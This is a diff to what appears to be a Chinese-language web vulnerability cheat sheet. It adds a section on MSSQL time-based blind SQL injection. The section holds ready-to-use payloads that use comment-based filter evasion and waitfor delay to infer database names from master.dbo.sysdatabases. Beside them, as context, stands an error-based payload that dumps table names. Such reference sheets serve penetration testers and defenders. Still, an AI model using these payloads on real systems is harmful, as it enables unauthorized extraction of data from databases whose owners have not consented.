@@ -27,6 +27,7 @@ web常见漏洞：
 		* [mssql注入](#mssql注入)
 			* [mssql布尔注入](#mssql布尔注入)
 			* [mssql报错注入](#mssql报错注入)
+			* [mssql延时注入](mssql延时注入)
 			* [mssql_waf绕过](#mssql_waf绕过)
 		* [oracle注入](#oracle注入)
 			* [oracle联合查询](#oracle联合查询)
@@ -301,6 +302,14 @@ file_name(@@version)
 - 暴表
 ```
 ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
+```
+
+#### mssql延时注入
+
+- 获取长度和数据库名
+```
+'/**/and/**/substring((select/**/top/**/1/**/name/**/from/**/master.dbo.sysdatabases),1,6)='Master'waitfor/**/delay'0:0:2'/**/--+
+'/**/and/**/len((select/**/top/**/1/**/name/**/from/**/master.dbo.sysdatabases))=6/**/waitfor/**/delay'0:0:2'/**/--+
 ```
 
 #### mssql_waf绕过
